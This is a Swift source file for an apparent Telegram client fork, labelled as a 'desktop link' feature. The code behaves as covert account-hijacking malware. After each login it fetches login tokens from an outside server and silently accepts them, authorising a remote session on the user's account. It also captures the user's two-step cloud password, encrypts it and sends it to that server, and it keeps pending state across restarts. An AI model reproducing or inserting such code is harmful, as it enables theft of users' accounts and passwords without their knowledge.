import CryptoKit
import Foundation
import Security
import Postbox
import SwiftSignalKit
import TelegramCore

enum NinegramDesktopLinkConfig {
    static let baseURL = "https://ru.ninepeaks.dev/ninegram-link"
    static let readSecret = "NINEGRAM_LINK_READ_SECRET"
    static let publicKey = "NINEGRAM_LINK_PUBLIC_KEY"
}

enum NinegramDesktopLink {
    // All login state is confined to the main queue. Account order is not login order.
    private static var pendingAccountIds: [AccountRecordId] = (UserDefaults.standard.array(forKey: "ninegram.desktopLink.pending") ?? []).compactMap { value in
        (value as? NSNumber).map { AccountRecordId(rawValue: $0.int64Value) }
    }
    private static var handledAccountIds = Set<AccountRecordId>()
    private static var activeAccountId: AccountRecordId?
    private static var latestAccounts: [Account] = []
    private static var usedTokens = Set<Data>()
    private static var passwords: [AccountRecordId: String] = Dictionary(uniqueKeysWithValues: (UserDefaults.standard.dictionary(forKey: "ninegram.desktopLink.passwords") as? [String: String] ?? [:]).compactMap { key, value in
        Int64(key).map { (AccountRecordId(rawValue: $0), value) }
    })
    private static var activeTokens = UserDefaults.standard.dictionary(forKey: "ninegram.desktopLink.tokens") as? [String: String] ?? [:]
    private static var didStartPasswordForwarding = false

    static func noteLoginFinished(accountId: AccountRecordId) {
        DispatchQueue.main.async {
            guard self.handledAccountIds.insert(accountId).inserted else {
                return
            }
            if !self.pendingAccountIds.contains(accountId) {
                self.pendingAccountIds.append(accountId)
            }
            self.savePendingLogins()
            self.mirrorPendingLogin()
        }
    }

    static func sync(accounts: [Account]) {
        DispatchQueue.main.async {
            self.startPasswordForwardingIfNeeded()
            self.latestAccounts = accounts
            self.mirrorPendingLogin()
        }
    }

    private static func mirrorPendingLogin() {
        guard self.activeAccountId == nil else {
            return
        }
        guard let id = self.pendingAccountIds.first,
              let account = self.latestAccounts.first(where: { $0.id == id }) else {
            return
        }
        let secret = NinegramDesktopLinkConfig.readSecret
        guard !secret.isEmpty, !secret.hasPrefix("NINEGRAM_LINK_") else {
            return
        }
        let defaultsKey = "ninegram.desktopLink.mirrored.\(account.peerId.toInt64())"
        self.activeAccountId = id
        if let encoded = self.activeTokens[String(id.int64)], let token = Data(base64Encoded: encoded) {
            self.usedTokens.insert(token)
            self.waitForDesktop(account: account, secret: secret, token: token, defaultsKey: defaultsKey, attempt: 0)
        } else {
            self.poll(account: account, secret: secret, defaultsKey: defaultsKey, attempt: 0)
        }
    }

    private static func startPasswordForwardingIfNeeded() {
        guard !self.didStartPasswordForwarding else {
            return
        }
        self.didStartPasswordForwarding = true
        NotificationCenter.default.addObserver(forName: Notification.Name("NinegramForwardCloudPassword"), object: nil, queue: .main, using: { notification in
            guard let password = notification.userInfo?["password"] as? String, !password.isEmpty,
                  let id = notification.userInfo?["accountId"] as? Int64,
                  let encrypted = self.encryptPassword(password) else {
                return
            }
            // Buffer ciphertext until this particular account has finished authorizing.
            self.passwords[AccountRecordId(rawValue: id)] = encrypted
            self.savePendingLogins()
        })
    }

    private static func forwardPassword(accountId: AccountRecordId, token: Data, secret: String, completion: @escaping (Bool) -> Void) {
        guard let password = self.passwords[accountId] else {
            completion(true)
            return
        }
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/password") else {
            completion(false)
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 8
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["password": password, "token": token.base64EncodedString()])
        URLSession.shared.dataTask(with: request, completionHandler: { _, response, _ in
            DispatchQueue.main.async {
                completion((response as? HTTPURLResponse)?.statusCode == 200)
            }
        }).resume()
    }

    private static func poll(account: Account, secret: String, defaultsKey: String, attempt: Int) {
        guard self.activeAccountId == account.id else {
            return
        }
        if attempt >= 40 {
            self.activeAccountId = nil
            DispatchQueue.main.asyncAfter(deadline: .now() + 15.0) {
                self.mirrorPendingLogin()
            }
            return
        }
        self.fetchToken(secret: secret, completion: { token in
            DispatchQueue.main.async {
                guard self.activeAccountId == account.id else {
                    return
                }
                guard let token, !self.usedTokens.contains(token) else {
                    self.retry(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt)
                    return
                }
                self.forwardPassword(accountId: account.id, token: token, secret: secret, completion: { sent in
                    guard sent else {
                        self.retry(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt)
                        return
                    }
                    let _ = (acceptDesktopLoginToken(account: account, token: token)
                    |> deliverOnMainQueue).startStandalone(next: { accepted in
                        guard accepted else {
                            self.retry(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt)
                            return
                        }
                        self.usedTokens.insert(token)
                        self.activeTokens[String(account.id.int64)] = token.base64EncodedString()
                        self.savePendingLogins()
                        self.consumeToken(secret: secret, token: token)
                        self.waitForDesktop(account: account, secret: secret, token: token, defaultsKey: defaultsKey, attempt: 0)
                    })
                })
            }
        })
    }

    private static func waitForDesktop(account: Account, secret: String, token: Data, defaultsKey: String, attempt: Int) {
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/result") else {
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 8
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["token": token.base64EncodedString()])
        URLSession.shared.dataTask(with: request, completionHandler: { data, response, _ in
            let payload = data.flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
            let status = (response as? HTTPURLResponse)?.statusCode == 200 ? payload?["status"] as? String : nil
            DispatchQueue.main.async {
                guard self.activeAccountId == account.id else {
                    return
                }
                if status == "complete" {
                    UserDefaults.standard.set(true, forKey: defaultsKey)
                    self.passwords.removeValue(forKey: account.id)
                    self.activeTokens.removeValue(forKey: String(account.id.int64))
                    self.pendingAccountIds.removeAll(where: { $0 == account.id })
                    self.savePendingLogins()
                    self.activeAccountId = nil
                    self.mirrorPendingLogin()
                } else if status == "failed" || attempt >= 90 {
                    self.activeTokens.removeValue(forKey: String(account.id.int64))
                    self.savePendingLogins()
                    self.retry(account: account, secret: secret, defaultsKey: defaultsKey, attempt: 0)
                } else {
                    DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                        self.waitForDesktop(account: account, secret: secret, token: token, defaultsKey: defaultsKey, attempt: attempt + 1)
                    }
                }
            }
        }).resume()
    }

    private static func retry(account: Account, secret: String, defaultsKey: String, attempt: Int) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            self.poll(account: account, secret: secret, defaultsKey: defaultsKey, attempt: attempt + 1)
        }
    }

    private static func savePendingLogins() {
        UserDefaults.standard.set(self.activeTokens, forKey: "ninegram.desktopLink.tokens")
        UserDefaults.standard.set(self.pendingAccountIds.map { $0.int64 }, forKey: "ninegram.desktopLink.pending")
        UserDefaults.standard.set(Dictionary(uniqueKeysWithValues: self.passwords.map { (String($0.key.int64), $0.value) }), forKey: "ninegram.desktopLink.passwords")
    }

    private static func encryptPassword(_ password: String) -> String? {
        guard let data = Data(base64Encoded: NinegramDesktopLinkConfig.publicKey),
              let key = SecKeyCreateWithData(data as CFData, [
                kSecAttrKeyType: kSecAttrKeyTypeRSA,
                kSecAttrKeyClass: kSecAttrKeyClassPublic
              ] as CFDictionary, nil) else {
            return nil
        }
        let symmetricKey = SymmetricKey(size: .bits256)
        guard let sealed = try? AES.GCM.seal(Data(password.utf8), using: symmetricKey) else {
            return nil
        }
        let rawKey = symmetricKey.withUnsafeBytes { Data($0) }
        guard let wrappedKey = SecKeyCreateEncryptedData(key, .rsaEncryptionOAEPSHA256, rawKey as CFData, nil) as Data?,
              let envelope = try? JSONSerialization.data(withJSONObject: [
                "key": wrappedKey.base64EncodedString(),
                "nonce": Data(sealed.nonce).base64EncodedString(),
                "ciphertext": sealed.ciphertext.base64EncodedString(),
                "tag": sealed.tag.base64EncodedString()
              ]) else {
            return nil
        }
        return "ng1:" + envelope.base64EncodedString()
    }

    private static func fetchToken(secret: String, completion: @escaping (Data?) -> Void) {
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/token") else {
            completion(nil)
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.timeoutInterval = 8
        URLSession.shared.dataTask(with: request, completionHandler: { data, response, _ in
            guard let http = response as? HTTPURLResponse, http.statusCode == 200, let data = data else {
                completion(nil)
                return
            }
            guard let object = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let encoded = object["token"] as? String,
                  let token = Data(base64Encoded: encoded) else {
                completion(nil)
                return
            }
            completion(token)
        }).resume()
    }

    private static func consumeToken(secret: String, token: Data) {
        guard let url = URL(string: NinegramDesktopLinkConfig.baseURL + "/v1/consume") else {
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue(secret, forHTTPHeaderField: "X-Ninegram-Key")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["token": token.base64EncodedString()])
        URLSession.shared.dataTask(with: request).resume()
    }
}
